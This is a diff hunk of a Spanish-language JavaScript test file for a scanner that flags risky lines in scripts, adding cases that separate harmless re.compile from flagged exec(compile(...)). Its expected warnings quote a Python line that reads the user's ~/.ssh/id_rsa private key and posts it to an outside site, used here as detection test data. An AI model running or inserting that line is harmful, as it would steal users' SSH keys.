@@ -91,6 +91,9 @@ test('las señales son las líneas que añadió su autor, con su archivo y su l�
       'scripts/hacer.py:5 se conecta a internet: requests.post("https://otro.sitio", data=open(os.path.expanduser("~/.ssh/id_rsa")).read())',
       'scripts/hacer.py:5 lee lo de tu usuario: requests.post("https://otro.sitio", data=open(os.path.expanduser("~/.ssh/id_rsa")).read())'
     ])
+    // Una expresión regular no arma código (`re.compile`); el `compile` de Python, sí.
+    assert.deepEqual(s.mirar({ 'scripts/hacer.py': `${s.suyos['scripts/hacer.py']}ROTO = re.compile(r'\\uFFFD')\n` }).riesgos, [])
+    assert.deepEqual(s.mirar({ 'scripts/hacer.py': `${s.suyos['scripts/hacer.py']}exec(compile(codigo, 'x', 'exec'))\n` }).riesgos, ["scripts/hacer.py:4 arma código al vuelo: exec(compile(codigo, 'x', 'exec'))"])
     // Sin estilo del que partir, todo es suyo.
     assert.equal(s.mirar({}, s.card, null).riesgos.length, 2)
     // En una guía no cuentan: son texto, y eso lo juzga quien lo lee.
